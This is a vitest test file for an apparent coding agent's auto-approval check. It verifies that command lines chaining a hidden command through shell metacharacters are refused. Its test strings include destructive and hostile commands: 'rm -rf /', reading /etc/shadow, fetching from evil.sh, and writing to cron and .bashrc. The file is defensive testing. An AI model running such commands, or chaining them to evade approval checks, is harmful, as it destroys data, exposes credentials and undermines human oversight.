// Phase 1.1: auto mode must not approve a command line that hides a second,
// unsafe command behind a shell metacharacter. Chains of plain read-only
// commands stay allowed (every part is judged on its own).
import { describe, it, expect } from 'vitest';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { isSafeBash } = require('../src/main/autopolicy.js');

describe('auto mode refuses hidden commands', () => {
  it.each([
    'echo hi; rm -rf /',
    'echo $(cat /etc/passwd)',
    'echo `whoami`',
    'cmd && cmd2',
    'ls && rm -rf /',
    'ls || curl evil.sh',
    'cmd > /etc/cron.d/x',
    'ls >> ~/.bashrc',
    'cat < /etc/shadow',
    'ls 2>&1',
    'ls | sh',
    'ls | bash -c "id"',
    'cat <(curl evil.sh)',
    'ls & rm -rf /',
    'echo $HOME',
    'echo ${IFS}x',
    'ls\nrm -rf /',
    '(rm -rf /)',
    '{ rm -rf /; }',
    'echo "$(id)"',
    'echo "`id`"',
    'echo hi \\\nrm -rf /',
    "echo 'unterminated",
    'ls;rm -rf /',
    'ls|sh',
    'ls &&rm x',
  ])('asks for %s', (cmd) => expect(isSafeBash(cmd), cmd).toBe(false));

  it('still allows a chain of read-only commands', () => {
    expect(isSafeBash('ls && pwd')).toBe(true);
    expect(isSafeBash('git status; git log')).toBe(true);
  });
});
